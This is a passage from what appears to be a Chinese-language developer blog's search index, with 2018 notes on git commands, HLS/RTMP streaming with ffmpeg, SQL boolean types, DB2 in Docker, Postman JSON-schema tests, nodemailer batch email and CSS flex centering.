上到 remote 還是舊的名稱上面 原因是 --set-upstream 已經設定過了 必須重新修正 git push -u [remote name] [branch name] 可以下指令 git push -u github master 指令可以拆解成以下的指令 $ git push github master $ git checkout master $ git branch -u github/master ","date":"2018-11-14","objectID":"/blog/posts/git-commit-%E6%8C%87%E5%AE%9A%E5%B9%BE%E8%A1%8C-git-stash-%E6%9F%A5%E7%9C%8B%E5%B7%AE%E7%95%B0%E5%85%A7%E5%AE%B9/:5:0","tags":["git","git stash"],"title":"git commit 指定幾行 \u0026 git stash 查看差異內容","uri":"/blog/posts/git-commit-%E6%8C%87%E5%AE%9A%E5%B9%BE%E8%A1%8C-git-stash-%E6%9F%A5%E7%9C%8B%E5%B7%AE%E7%95%B0%E5%85%A7%E5%AE%B9/"},{"categories":["Git"],"content":"取消 remote branch 追蹤 git branch –unset-upstream 取消當前分支 git branch –unset-upstream master 也能指定分支 ","date":"2018-11-14","objectID":"/blog/posts/git-commit-%E6%8C%87%E5%AE%9A%E5%B9%BE%E8%A1%8C-git-stash-%E6%9F%A5%E7%9C%8B%E5%B7%AE%E7%95%B0%E5%85%A7%E5%AE%B9/:6:0","tags":["git","git stash"],"title":"git commit 指定幾行 \u0026 git stash 查看差異內容","uri":"/blog/posts/git-commit-%E6%8C%87%E5%AE%9A%E5%B9%BE%E8%A1%8C-git-stash-%E6%9F%A5%E7%9C%8B%E5%B7%AE%E7%95%B0%E5%85%A7%E5%AE%B9/"},{"categories":["HTML"],"content":"最近看到網頁上的影音，他播放的時候不會全下載 好奇就網頁爬了一下 是用 hls 技術，雖然現在還沒有用到 不過我還滿感一點興趣 就查一些記錄，筆記筆記 M3U8 串流影音 - 概念 與 下載 - NotFalse 技術客 流媒体：ffmpeg 生成 HLS 的 m3u8 与 ts 片段 - 小雨伞漂流记 - 开源中国 ffmpeg 常用基本命令(转) - wainiwann - 博客园 切割 hls 檔案 ffmpeg -i low_30.mp3 -c:a aac -b:a 64k -vn -hls_list_size 0 abc.m3u8 ffmpeg -i eq_1.mp4 -vcodec copy -acodec copy ~~-vbsf h264_mp4toannexb~~ -hls_time 10 -hls_list_size 999999999 output.m3u8 -vbsf h264_mp4toannexb 拿掉就可以跑了 雖然不知道甚麼問題，不過解決了 Only one .ts file is generating while encoding mp3 file to m3u8 using ffmpeg - Stack Overflow ffmpeg HTTP Live Streaming Albert 的筆記本: HLS (HTTP Live streams) 介紹 巴哈動畫瘋 跳過網站直抓 m3u8 (更新版 – 柏狗屁世界 SRS 中增加身份验证 - dlbtsoft - 博客园 srs 身份认证«海底苍鹰(tank)博客 樹莓派架設 RTMP 串流（Streaming）伺服器，傳送即時攝影機影像 - G. T. Wang v2_CN_Home · ossrs/srs Wiki Directives · arut/nginx-rtmp-module Wiki 重启 php7-fpm 和 php5-fpm 方法大全 - 歪麦博客 三种主流流媒体协议(RTMP，RTSP，HTTP)比较 - 流媒体技术 - AMS- 为天下企业提供流媒体软件引擎！ How can I display an RTSP video stream in a web page? - Stack Overflow 流媒体之 RTSP/RTP/RTCP | Winddoing’s Blog Setting up HLS live streaming server using NGINX - Peer5 Docs srs 身份认证«海底苍鹰(tank)博客 srs 流媒体服务器 安装配置«海底苍鹰(tank)博客 ffmpeg 处理 RTMP 流媒体的命令大全 - 雷霄骅(leixiaohua1020)的专栏 - CSDN 博客 ffmpeg 處理 RTMP 流媒體的命令和傳送流媒體的命令（UDP，RTP，RTMP） - 掃文資訊 Nginx-rtmp 模块实现流媒体 play、push、pull 功能-Dream come true-51CTO 博客 直播技术实现(一) 直播技术实现(二) 筆記：使用 nginx 搭建一個 HLS(HTTP Live Streaming) \u0026 Rtmp 直播服務器 | 奈特的魔法科研 名詞簡單小記 SRS(Simple RTMP Server) 架設 RTMP Server 簡單來說就是直播伺服器 3、将其中一个直播流，视频改用 h264 压缩，音频不变，送至另外一个直播服务流 ffmpeg -i rtmp://server/live/originalStream -c:a copy -c:v libx264 -vpre slow -f flv rtmp://server/live/h264Stream 當出看一直看不到為什麼 rtmp 傳到另一個 rtmp 後來看到直播服務流 就想到應該像 youtube,twitter 讓我想到 obs 應該也是發到 rtmp server 去 rtmp rstp hls(http live streaming) 三种主流流媒体协议(RTMP，RTSP，HTTP)比较 - 流媒体技术 - AMS- 为天下企业提供流媒体软件引擎！ 1、HTTP協議: HTTP的視頻協議，主要是在互聯網普及之後。在互聯網上看視頻的需求下形成的。 最初的HTTP視頻協議，沒有任何特別之處，就是通用的HTTP文件漸進式下載。本質就是下載視頻文件，而利用視頻文件本身的特點，就是存在頭部信息，和部分視頻幀數據，就完全可以解碼播放了。顯然這種方式需要將視頻文件的頭部信息放在文件的前面。有些例如faststart工具，就是專門做這個功能的。 但是最為原始的狀態下，視頻無法進行快進或者跳轉播放到文件尚未被下載到的部分。這個時候對HTTP協議提出了range-request的要求。這個目前幾乎所有HTTP的服務器都支持了。range-request，是請求文件的部分數據，指定偏移字節數。在視頻客戶端解析出視頻文件的頭部後，就可以判斷後續視頻相應的幀的位置了。或者根據碼率等信息，計算相應的為位置。 優點： HTTP Live Streaming 還有一個巨大優勢：自適應碼率流播（adaptive streaming）。效果就是客戶端會根據網絡狀況自動選擇不同碼率的視頻流，條件允許的情況下使用高碼率，網絡繁忙的時候使用低碼率，並且自動在二者間隨意切換。這對移動設備網絡狀況不穩定的情況下保障流暢播放非常有幫助。實現方法是服務器端提供多碼率視頻流，並且在列表文件中註明，播放器根據播放進度和下載速度自動調整。使用起來也非常簡單。 缺點： 實時性相對較差，直播的時候延遲比較高。當然，現在進化出來的flv_over_http或者ts_over_http也可以做到直播延時很低，基本和rtmp協議差不多。 2、RTSP協議： 用於Internet上針對多媒體數據流的一種傳輸協議，是TCP/IP協議體系中的一個應用層協議，RTSP在體系結構上位於RTP和RTCP之上，它使用TCP或UDP完成數據傳輸，該協議定義了一對多應用程序如何有效地通過IP網絡傳送多媒體數據。 本協議是最早的視頻傳輸協議。其中RTSP協議用於視頻點播的會話控制，例如發起點播請求的SETUP請求，進行具體播放操作的PLAY、PAUSE請求，視頻的跳轉也是通過PLAY請求的參數支持的。 優點： RTSP協議族的優勢，在於可以控制到視頻幀，因此可以承載實時性很高的應用。這個優點是相對於HTTP方式的最大優點。H.323視頻會議協議，底層一般採用RTSP協議。RTSP協議族的複雜度主要集中在服務器端，因為服務器端需要parse視頻文件，seek到具體的視頻幀，而且可能還需要進行倍速播放（就是老舊的DVD帶的那種2倍速，4倍速播放的功能），倍速播放功能是RTSP協議獨有的，其他視頻協議都無法支持。 缺點： 就是服務器端的複雜度也比較高，實現起來也比較複雜。Ios端不支持該協議。 3、RTMP協議： RTMP是Real Time Messaging Protocol（實時消息傳輸協議）的首字母縮寫。RTMP(Real Time Messaging Protocol)實時消息傳送協議是Adobe Systems公司為Flash播放器和服務器之間音頻、視頻和數據傳輸 開發的開放協議。該協議基於TCP，是一個協議族，包括RTMP基本協議及RTMPT/RTMPS/RTMPE等多種變種。RTMP是一種設計用來進行實時數據通信的網絡協議，主要用來在Flash/AIR平台和支持RTMP協議的流媒體/交互服務器之間進行音視頻和數據通信。支持該協議的軟件包括Adobe Media Server/Aoku Media Server/red5/Wowza等。 優點： 支持直播、點播 缺點: 需要專用的服務器。 三、協議對比 關於三個RTMP，RTSP，HTTP的對比： 1.RTMP是adobe的，RTSP是 android native支持，http協議。 2.RTMP和HTTP有adaptive streaming的技術，RTSP沒有 3.RTSP實時性是最好的，HTTP實時性比較差。 4.ios不支持rtsp，安卓支持。 四、總結 三種協議各有優缺點，rtmp協議應用範圍比較窄，一般客戶端需要用flash接收，rtsp一般常用於監控領域和對實時性要求比較高的場合，http的延伸hls用的比較多，一般用在移動終端觀看，一般一個成熟的流媒體服務系統都需要支持這三種協議，甚至更多的協議，比如udp組播，單播，或者p2p協議等。 Aoku Media Server是可以同時支持這三種流媒體協議的。是國內為數不多的專業流媒體服務系統，提供的免費版可以供用戶進行三種協議的測試對比 簡單來說，hls 是基於 http 但是只有 apple 支援，所以 apple 裝置可以直接用 要瀏覽器支援要用video-dev/hls.js: JavaScript HLS client using Media Source Extension nginx-rtmp-module 目前感覺就是跟 rtmp 與 rtmp server 串接用 Nginx-rtmp 模块实现流媒体 play、push、pull 功能-Dream come true-51CTO 博客 備份圖 Nginx RTMP Module - 架構在Nginx之上, 也算老牌了, 支援RTMP和HLS, 但看code base, 實在也沒啥在更新 Mona se","date":"2018-11-13","objectID":"/blog/posts/hls%E5%BD%B1%E9%9F%B3%E4%B8%B2%E6%B5%81%E5%B0%8F%E8%A8%98/:0:0","tags":["hls","ffmpeg"],"title":"hls影音串流小記","uri":"/blog/posts/hls%E5%BD%B1%E9%9F%B3%E4%B8%B2%E6%B5%81%E5%B0%8F%E8%A8%98/"},{"categories":["HTML"],"content":"hls 加密 HLS 协议详解 · Akagi201 hls 加密 - Google 搜尋 流媒体加密 · Issue #10 · gwuhaolin/blog HLS 架构简介及播放加密的 HLS - Android - 掘金 雖然最近沒有打算做這個相關東西 但是不知道為什麼對 hls 特別有興趣 XD 越記越多，希望哪天有機會用到 ","date":"2018-11-13","objectID":"/blog/posts/hls%E5%BD%B1%E9%9F%B3%E4%B8%B2%E6%B5%81%E5%B0%8F%E8%A8%98/:1:0","tags":["hls","ffmpeg"],"title":"hls影音串流小記","uri":"/blog/posts/hls%E5%BD%B1%E9%9F%B3%E4%B8%B2%E6%B5%81%E5%B0%8F%E8%A8%98/"},{"categories":["SQL"],"content":"最近做SELECT TRUE 在SQL的時候 發現adminer跑出來結果是1 覺得有點不科學 在很久的時候，MySQL操作phpmyadmin設定欄位都會看到有boolean這個選項 就以為boolean有這個東西 由於過去大學專題java都是用rs.getBoolean(xxx)也沒有發現這個問題 上一間公司是使用DB2都用varchar(1) [Y,N] 所以沒有遇過這個問題 今天遇到這個狀況有點錯愕orz 覺得怪怪的 最後網路查了一下，MySQL實做上會把boolean當tinyint(1)使用 DB2剛好開docker玩 下sql發現不能新增boolean欄位型態!!! Google一下發現db2沒有boolean型態 sql server,db2 做select True from xxxxx(依照db不能) 會產生錯誤 這時候我就很好奇oracle,sql server到底有沒有這個東西(boolean) 這邊簡單記錄 mysql,postgres 有 boolean 型態 oracle,sql server, db2都不能用boolean SQL92建義用bit，但是oracle推使用number 目前我同事是使用tinyint(1)，不過他也不知道sql server沒有boolean型態…. 可參考以下內容 sql - Boolean vs tinyint(1) for boolean values in MySQL - Stack Overflow 其中， linq to sql 自然就將 IsRetired 欄位當成 boolean 值，0 是 false, 1 是 true. 這在 sql server 是相當自然而沒有疑慮的事情。 那在 Oracle 呢？Oracle 是資料庫的老大，當然不需要 follow 標準。(所以別怪 MS Office 不照 OpenDocument format (ODF) 的標準，而要自行搞一套 Office Open Xml 的標準) Oracle 不支援 bit 的 datatype，甚至在 Oracle vs. SQL Server中也指明了，bit 的相等的oracle 表達法是 number(1, 0)。 是否我們需要存 boolean 值時，在oracle 就宣告成 number(1, 0) 呢？ 將來如果出了一個 linq to oracle 的 privider，是否看到 number(1, 0) 就自行轉成 boolean 呢？ 看了很多前人的程式，都是自行定義的，如 char(1)，然後寫入值為 '0' 或 '1' ，也有寫成 'Y' 或 'N\"，當然也有 'y' 或 'n'。 實在令人頭痛。 如果是您，不知道您會如何宣告呢？ 突然想到我上一間公司是使用db2 那時候他們說只用varchar型態 boolean幾乎都是用Y,N 那時候也不知道為什麼… 現在終於知道了 只不過這樣註解是不是都要特別記? 请问db2有boolean数据类型吗？？-CSDN论坛 DB2中类似于ORACLE中的DUAL表的表 - Menjoy’s 技术文摘 - ITeye博客 程湘之間: Oracle 學習(3) boolean 的資料欄位 关于oracle的boolean问题 - mrdu_somefun的博客 - CSDN博客 然後我翻我買的MySQL裡面也沒有提到Boolean這型態!!!! 看來錯誤觀念要修正… ","date":"2018-11-09","objectID":"/blog/posts/DB%E5%88%B0%E5%BA%95%E6%9C%89%E6%B2%92%E6%9C%89boolean%E5%9E%8B%E6%85%8B%E5%91%A2/:0:0","tags":["sql","mysql","db2"],"title":"DB到底有沒有boolean型態呢","uri":"/blog/posts/DB%E5%88%B0%E5%BA%95%E6%9C%89%E6%B2%92%E6%9C%89boolean%E5%9E%8B%E6%85%8B%E5%91%A2/"},{"categories":["Git"],"content":"最近有同事需要我異動有哪些檔案 我找一個(方便)方法到用git看方法 在這邊小記 ","date":"2018-11-09","objectID":"/blog/posts/git%E6%9F%A5%E7%9C%8B%E5%85%A9%E5%80%8Bcommit%E7%95%B0%E5%8B%95%E6%9C%89%E5%93%AA%E4%BA%9B%E6%AA%94%E6%A1%88%E5%92%8C%E6%89%93%E5%8C%85%E6%96%B9%E6%B3%95/:0:0","tags":["git","git archive"],"title":"git查看兩個commit異動有哪些檔案和打包方法","uri":"/blog/posts/git%E6%9F%A5%E7%9C%8B%E5%85%A9%E5%80%8Bcommit%E7%95%B0%E5%8B%95%E6%9C%89%E5%93%AA%E4%BA%9B%E6%AA%94%E6%A1%88%E5%92%8C%E6%89%93%E5%8C%85%E6%96%B9%E6%B3%95/"},{"categories":["Git"],"content":"git diff-tree git diff-tree git diff-tree --no-commit-id --name-only -r commit_id1 commit_id2 不過這個在我公司那台怪怪的 我家電腦正常 所以才找到下面這個方法 ","date":"2018-11-09","objectID":"/blog/posts/git%E6%9F%A5%E7%9C%8B%E5%85%A9%E5%80%8Bcommit%E7%95%B0%E5%8B%95%E6%9C%89%E5%93%AA%E4%BA%9B%E6%AA%94%E6%A1%88%E5%92%8C%E6%89%93%E5%8C%85%E6%96%B9%E6%B3%95/:1:0","tags":["git","git archive"],"title":"git查看兩個commit異動有哪些檔案和打包方法","uri":"/blog/posts/git%E6%9F%A5%E7%9C%8B%E5%85%A9%E5%80%8Bcommit%E7%95%B0%E5%8B%95%E6%9C%89%E5%93%AA%E4%BA%9B%E6%AA%94%E6%A1%88%E5%92%8C%E6%89%93%E5%8C%85%E6%96%B9%E6%B3%95/"},{"categories":["Git"],"content":"git diff git diff --name-only commit_id1 commit_id2 Making git diff –stat show full file path - Stack Overflow ","date":"2018-11-09","objectID":"/blog/posts/git%E6%9F%A5%E7%9C%8B%E5%85%A9%E5%80%8Bcommit%E7%95%B0%E5%8B%95%E6%9C%89%E5%93%AA%E4%BA%9B%E6%AA%94%E6%A1%88%E5%92%8C%E6%89%93%E5%8C%85%E6%96%B9%E6%B3%95/:2:0","tags":["git","git archive"],"title":"git查看兩個commit異動有哪些檔案和打包方法","uri":"/blog/posts/git%E6%9F%A5%E7%9C%8B%E5%85%A9%E5%80%8Bcommit%E7%95%B0%E5%8B%95%E6%9C%89%E5%93%AA%E4%BA%9B%E6%AA%94%E6%A1%88%E5%92%8C%E6%89%93%E5%8C%85%E6%96%B9%E6%B3%95/"},{"categories":["Git"],"content":"打包檔案方法 git archive --format zip -o filename.zip HEAD git archive --format zip -o $(git log --date=short --pretty=format:\"%ad\" -1).zip HEAD $ cat \u003e ~/bin/git-zip #!/bin/sh git archive --format zip -o $(git log --pretty=format:\"%h\" -1).zip HEAD $ chmod u+x ~/bin/git-zip $ cd git-repository $ git zip 以上範例參考如git archive 與 log 小技巧 – Rex’s blah blah blah 感覺這東西以後還是會用的到 更進階的用法:如何讓Git匯出兩個Commit之間更新或新增的檔案 – 可達鴨村 Date: 2018-12-15 今天PM跟我要最近上傳更動幾個commit 由於我們公司上傳git方式比較不一樣 部屬程式導致有些commit有上線、有些沒有上線…. 剛好之前有記錄到如何讓Git匯出兩個Commit之間更新或新增的檔案 – 可達鴨村 裡面有 echo Eport GitDiff set /p input1=Export Start Commit ID: set commitIdStart=%input1% set /p input2=Export End Commit ID: if [%input2%] ==[] (set commitIdEnd=HEAD) else (set commitIdEnd=%input2%) echo Start ID = %commitIdStart% echo End ID = %commitIdEnd% for /f \"skip=1\" %%x in ('wmic os get localdatetime') do if not defined DateTime set DateTime=%%x echo %DateTime% set exportFolder=%DateTime:~0,4%%DateTime:~4,2%%DateTime:~6,2%_%DateTime:~8,6% echo %exportFolder% for /f \"usebackq tokens=*\" %%A in (`git diff-tree -r --no-commit-id --name-only --diff-filter=ACMRT %commitIdStart% %commitIdEnd%`) do echo FA|xcopy \"%%~fA\" \"GitExport\\%exportFolder%\\%%A\" set /p DUMMY =Hit Enter To Continue.... 這段就派上用場了 我以為這些內容都是從commit提取出來 但事實上不是這樣的 其實是透過git diff-tree顯示commit 改動有哪些檔案 然後她會從你現在本地端複製檔案到資料夾裡面，不是從commit複製當時候的內容 所以使用上也要特別注意一下head現在狀態是不是你要打包的內容 上面敘述commit踩雷事項 因為上次實作，需要做兩個commitcommitIdStart、commitIdEnd 輸入完只有打包到兩個commit內容 但是…其實第一個commit不會包到 也就是放置兩個commit第一個commit不會算到 為什麼呢? 其實git diff-tree是比較兩個commit差異，所以第一個commit不會被比較到 讓我想到rebase也是一樣 當不連續commit要怎麼辦 PM要求不練續的commit要怎麼辦? 其實我覺得上面腳本只適合做連續commit 但今天研究了一下 其實透過上面腳本還是能做到啦 只要改腳本 時間資料夾拿掉 在多次執行腳本就可以了 雖然還是沒反杜絕手動的錯誤 但還是可以這樣用 總比人工scp跟sftp是不樣的東西複製檔案好多了吧 ","date":"2018-11-09","objectID":"/blog/posts/git%E6%9F%A5%E7%9C%8B%E5%85%A9%E5%80%8Bcommit%E7%95%B0%E5%8B%95%E6%9C%89%E5%93%AA%E4%BA%9B%E6%AA%94%E6%A1%88%E5%92%8C%E6%89%93%E5%8C%85%E6%96%B9%E6%B3%95/:3:0","tags":["git","git archive"],"title":"git查看兩個commit異動有哪些檔案和打包方法","uri":"/blog/posts/git%E6%9F%A5%E7%9C%8B%E5%85%A9%E5%80%8Bcommit%E7%95%B0%E5%8B%95%E6%9C%89%E5%93%AA%E4%BA%9B%E6%AA%94%E6%A1%88%E5%92%8C%E6%89%93%E5%8C%85%E6%96%B9%E6%B3%95/"},{"categories":["Git"],"content":"最近在改程式，所以我重新上一個commitgit commit --amend 但做完發現…，我忘記做git add xxx了 當下Ctrl+C都不能中斷 只能QQ:q!or:qa! 這種事當然要找一下解法 ","date":"2018-11-09","objectID":"/blog/posts/git-reset-%E5%92%8Cgit-reflog%E5%B0%8F%E8%A8%98/:0:0","tags":["git"],"title":"git reset 和git reflog小記","uri":"/blog/posts/git-reset-%E5%92%8Cgit-reflog%E5%B0%8F%E8%A8%98/"},{"categories":["Git"],"content":"git reflog git reflog指令可以看最近刪除commit，之後會被自動刪除 可依照commit說明去找上次的內容 這時候想看reflog內容要怎麼看?? 這時候要用之前學得融會貫通XD git checkout commit_id 這樣就能切換過去 再git diff也能看到東西 ","date":"2018-11-09","objectID":"/blog/posts/git-reset-%E5%92%8Cgit-reflog%E5%B0%8F%E8%A8%98/:1:0","tags":["git"],"title":"git reset 和git reflog小記","uri":"/blog/posts/git-reset-%E5%92%8Cgit-reflog%E5%B0%8F%E8%A8%98/"},{"categories":["Git"],"content":"git reset git reset --hard commit_id 這樣就檢單還原 git reset –soft git reset –mixed 不過這指令記不時起來 2018-11-12 大師常來聊-高見龍談 Git 版控之final12345 剛好最近寫這篇，剛好沒說很熟git reset，腦還中對這個印象沒有運作的概念 今天剛好聽知這段，goto,become會比較容易理解 大師常來聊-高見龍談 Git 版控之final12345 - rebase合併 大師常來聊-高見龍談 Git 版控之final12345 - git flow 大師常來聊-高見龍談 Git 版控之final12345 - git 沒模組化很容易衝突 在沒做模組拆分很容易發生衝突，如:index.html 大師常來聊-高見龍談 Git 版控之final12345 - git checkout file 跟 git reset HEAD –mixed 差別 大師常來聊-高見龍談 Git 版控之final12345 - git PR 遇到衝突 其實下面兩個問題是我問題，希望之後實務上會用git更順利 基本上有基礎，再看那個直播會更容易了解 會看那個直播是剛好有買為了你自己學git，覺得書中內容不錯 剛好參加Kuro研討會順便去天龍書店逛的 好書!!就直接買了XD FB有看到簡易了解圖示 謝孟哲 - [git reset …] 問題很簡單，有辦法把 cache 的內容寫回 working directory 嗎？… 一直以為git reflog很難，一直沒有跨出這一步… 但是今天遇到這個狀況，卻不小心邁進一大步XD ","date":"2018-11-09","objectID":"/blog/posts/git-reset-%E5%92%8Cgit-reflog%E5%B0%8F%E8%A8%98/:2:0","tags":["git"],"title":"git reset 和git reflog小記","uri":"/blog/posts/git-reset-%E5%92%8Cgit-reflog%E5%B0%8F%E8%A8%98/"},{"categories":["Docker"],"content":"最近要實驗boolean在db2 會有什麼結果 所以找找有沒有docker簡單架設方法 可以在docker api玩 docker run -it -p 50000:50000 -e DB2INST1_PASSWORD=db2inst1-pwd -e LICENSE=accept ibmcom/db2express-c:latest bash $ su - db2inst1 $ db2start $ db2sampl $ db2 connect to sample $ db2 \"SELECT * FROM STAFF\" 有畫面就是正常 因為要實驗一個東西 這篇紀錄到這邊 參考來源： 通过Docker安装db2express-c — 董仁文的博客（沒有加上db2start） ibmcom/db2express-c - Docker Hub IBM Knowledge Center - 驗證分割的資料庫伺服器安裝（Linux 及 UNIX） ","date":"2018-11-08","objectID":"/blog/posts/%E4%BD%BF%E7%94%A8docker%E6%9E%B6%E8%A8%ADdb2%E7%92%B0%E5%A2%83/:0:0","tags":["docker","db2"],"title":"使用docker架設db2環境","uri":"/blog/posts/%E4%BD%BF%E7%94%A8docker%E6%9E%B6%E8%A8%ADdb2%E7%92%B0%E5%A2%83/"},{"categories":["JavaScript"],"content":"01:10 字串換算秒數很麻煩 今天看到神奇的解法 筆記筆記 \u003c?php $time=\"01:10\"; foreach (array_reverse(explode(':', $time)) as $index =\u003e $value) $sec += pow(60, $index) * $value; 最近看到神同事寫這段超短 超漂亮 我從來沒有想到pow可以運用到這個地方 雖然程效上，只會跑兩層 到24小時就換一天了XD 不過寫得真的很漂亮 稍微改成js版本 var time = '01:01' var time_array = time.split(':').reverse() var sec = 0 time_array.forEach( (value,index) =\u003e sec += Math.pow(60,index) * value ); ","date":"2018-11-07","objectID":"/blog/posts/%E6%99%82%E9%96%93%E6%8F%9B%E7%AE%97%E7%9A%84%E5%B0%8F%E6%8A%80%E5%B7%A7/:0:0","tags":["javascript"],"title":"時間換算的小技巧","uri":"/blog/posts/%E6%99%82%E9%96%93%E6%8F%9B%E7%AE%97%E7%9A%84%E5%B0%8F%E6%8A%80%E5%B7%A7/"},{"categories":["實用工具"],"content":"最近在實作 API，發現上次只有做 VSCODE 檢查 postman 假如可以用的話，也很方便 var schema = { \"$schema\": \"http://json-schema.org/draft-06/schema#\", ......(略) } }; pm.test(\"Check JSON\", function () { var jsonData = pm.response.json(); var valid = tv4.validate(jsonData, schema, false, true); if (valid !== true) { console.log(tv4.error); tests['tv4.error:' + tv4.error] = true; } pm.expect(valid).to.be.true; }); 只要在pre-test放這段就可以檢查了 參考來源: How do I test JSON schema in postman using tv4? - Stack Overflow javascript - Debug output in tests - Stack Overflow 2018-11-07 最近應為錯誤發現不會提示顯示哪裡錯誤 所以爬到How do I test JSON schema in postman using tv4? - Stack Overflow 修改一下程式碼 pm.test(\"Check JSON\", function() { var jsonData = pm.response.json(); var valid = tv4.validateMultiple(jsonData, schema, false, true); if (valid.errors) { valid.errors.forEach( (value, index) =\u003e (tests[value.schemaPath + \":\" + value.message] = true) ); } pm.expect(valid.errors.length === 0).to.be.true; }); 最後，假如要用上次 VSCODE setting.json好像沒辦法自動設定所有 json 檔案 只能單一設定 { \"json.schemas\": [ { \"fileMatch\": [\"xxx.api.json\"], \"url\": \"./xxx.schema.json\" }, { \"fileMatch\": [\"oooo.json\"], \"url\": \"./oooo.schema.json\" } ] } 未來有找到好方法再補 有找到VSCode 配置文件的变量索引 - 知乎 { //不能使用 \"json.schemas\": [ { \"fileMatch\": [\"${fileBasenameNoExtension}.json\"], \"url\": \"./${fileBasenameNoExtension}.schema.json\" } ] } 明天測試看能不能用 2018-11-09 確定不能使用 REST Client 好像沒有 JSON Schema 檢查工具 一些 github 上檢驗工具 ebdrup/json-schema-benchmark: Benchmarks for Node.js JSON-schema validators 2019-05-22 另類檢查寫法 var data = JSON.parse(responseBody); pm.test(\"response must be valid and have a body\", function() { // assert that the status code is 200 pm.response.to.be.ok; // assert that the response has a valid JSON body pm.response.to.be.withBody; pm.response.to.be.json; }); pm.test(\"respnse body has xxxx ?\", function() { pm.expect(data.response.xxxx).is.not.empty; pm.response.to.not.have.jsonBody(\"error\"); }); 參考來源: Test scripts | Postman Learning Center ","date":"2018-11-05","objectID":"/blog/posts/postman%E9%A9%97%E8%AD%89JSON-Schema%E6%96%B9%E6%B3%95/:0:0","tags":["postman","json schema"],"title":"postman驗證JSON Schema方法","uri":"/blog/posts/postman%E9%A9%97%E8%AD%89JSON-Schema%E6%96%B9%E6%B3%95/"},{"categories":["JavaScript"],"content":"由於之前工單信件寫錯… 需要補寄信件給使用者 今天研究nodejs使用nodemailer發信 發現真的還滿簡單好用 說不定下次就有機會可以用到 ","date":"2018-10-30","objectID":"/blog/posts/%E4%BD%BF%E7%94%A8nodemailer%E5%81%9A%E6%89%B9%E6%AC%A1%E5%AF%84%E4%BF%A1/:0:0","tags":["nodejs","nodemailer","mail"],"title":"使用nodemailer做批次寄信","uri":"/blog/posts/%E4%BD%BF%E7%94%A8nodemailer%E5%81%9A%E6%89%B9%E6%AC%A1%E5%AF%84%E4%BF%A1/"},{"categories":["JavaScript"],"content":"nodemailer malagege/sample-code-node-mail-batch: 批次發信範例 可注意(1)(2)(3)要改的地方 /////////(1) const csvFilePath='data.csv' var mail_from = 'from@xxxx.com.tw' var subject = '標題' var nodemailer = require('nodemailer'); const csv=require('csvtojson') /////////(2) var transporter = nodemailer.createTransport({ host: 'mail_server_url', port: 25 , secure: false, auth: { user: 'from@xxxx.com.tw', pass: 'password' } }); csv() .fromFile(csvFilePath) .then((jsonObj)=\u003e{ // console.log(jsonObj); /** * [ * {a:\"1\", b:\"2\", c:\"3\"}, * {a:\"4\", b:\"5\". c:\"6\"} * ] */ jsonObj.forEach(data =\u003e { /////////(3) let mail_to = data.usermail let email_template = ` Hello World!!!! \u003cimg src=\"${data.pic_url}\"\u003e\u003cbr\u003e 姓名：${data.username}\u003cbr\u003e 訂單編號：${data.no}\u003cbr\u003e ` var mailOptions = { from: mail_from, to: mail_to, //寄送人 subject: subject, html: email_template, }; // verify connection configuration // transporter.verify(function(error, success) { // if (error) { // console.log(error); // } else { // console.log('Server is ready to take our messages'); // } // }); transporter.sendMail(mailOptions, function(error, info) { if (error) { console.log('mail_to:' + mail_to) console.log(error); } else { console.log(mail_to + ' , Email sent: ' + info.response); } }); }); }) 另外，附加檔案可以參考sample-code-node-mail-batch/test_add_file.js at master · malagege/sample-code-node-mail-batch 程式參考來源: Nodejs发邮件组件Nodemailer | 粉丝日志 備份圖 ","date":"2018-10-30","objectID":"/blog/posts/%E4%BD%BF%E7%94%A8nodemailer%E5%81%9A%E6%89%B9%E6%AC%A1%E5%AF%84%E4%BF%A1/:1:0","tags":["nodejs","nodemailer","mail"],"title":"使用nodemailer做批次寄信","uri":"/blog/posts/%E4%BD%BF%E7%94%A8nodemailer%E5%81%9A%E6%89%B9%E6%AC%A1%E5%AF%84%E4%BF%A1/"},{"categories":["JavaScript"],"content":"preview-email https://www.npmjs.com/package/preview-email 可以簡單看預覽信件內容 雖然我覺得可以用寫死一個信箱看… 缺點好像附加檔案cid會抓不到 const previewEmail = require('preview-email'); ... previewEmail(message).then(console.log).catch(console.error); //transport.sendMail(message).then(console.log).catch(console.error); message跟nodemailer搭配 最後，email-templates我就沒研究了 看了文件感覺很複雜 我就先用程式邏輯就可以跑出我想要的 ","date":"2018-10-30","objectID":"/blog/posts/%E4%BD%BF%E7%94%A8nodemailer%E5%81%9A%E6%89%B9%E6%AC%A1%E5%AF%84%E4%BF%A1/:2:0","tags":["nodejs","nodemailer","mail"],"title":"使用nodemailer做批次寄信","uri":"/blog/posts/%E4%BD%BF%E7%94%A8nodemailer%E5%81%9A%E6%89%B9%E6%AC%A1%E5%AF%84%E4%BF%A1/"},{"categories":["實用工具"],"content":"最近朋友問我有甚麼好用截圖工具 但我也沒有用過 所以找了幾款 之後說不定哪天我也會用到 [免費] ImageSplitter 大圖切割/裁剪，圖檔分割工具 – 【重灌狂人】 Trimto v1.4.5.1 快速幫圖片裁切、修改尺寸、存檔…一氣呵成！ – 【重灌狂人】 ImageMagick之图片裁剪详解 - 简书 分割图片——免费在线剪切图片成多个小图片 ","date":"2018-10-30","objectID":"/blog/posts/%E6%88%AA%E5%9C%96%E5%B7%A5%E5%85%B7%E7%B4%80%E9%8C%84/:0:0","tags":["截圖"],"title":"截圖工具紀錄","uri":"/blog/posts/%E6%88%AA%E5%9C%96%E5%B7%A5%E5%85%B7%E7%B4%80%E9%8C%84/"},{"categories":["CSS"],"content":"之前寫程式發現用flex垂直至中超出畫面會有問題 一直以為都是用flex這個缺點不能用在大畫面上面 不過今天網路上找到兩個答案 簡單紀錄 ","date":"2018-10-25","objectID":"/blog/posts/flex-%E9%87%8D%E7%9B%B4%E7%BD%AE%E4%B8%AD-%E5%85%A7%E5%AE%B9%E5%A4%A7%E6%96%BC%E7%95%AB%E9%9D%A2%E4%B8%8A%E9%9D%A2%E8%A2%AB%E6%88%AA%E6%8E%89%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%B3%95/:0:0","tags":["flex","css"],"title":"flex 重直置中 內容大於畫面，上面被截掉解決方法","uri":"/blog/posts/flex-%E9%87%8D%E7%9B%B4%E7%BD%AE%E4%B8%AD-%E5%85%A7%E5%AE%B9%E5%A4%A7%E6%96%BC%E7%95%AB%E9%9D%A2%E4%B8%8A%E9%9D%A2%E8%A2%AB%E6%88%AA%E6%8E%89%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%B3%95/"},{"categories":["CSS"],"content":"unsafe justify-content: safe center align-self: safe center 目前只有Firefox 63支援 最近才到63XD 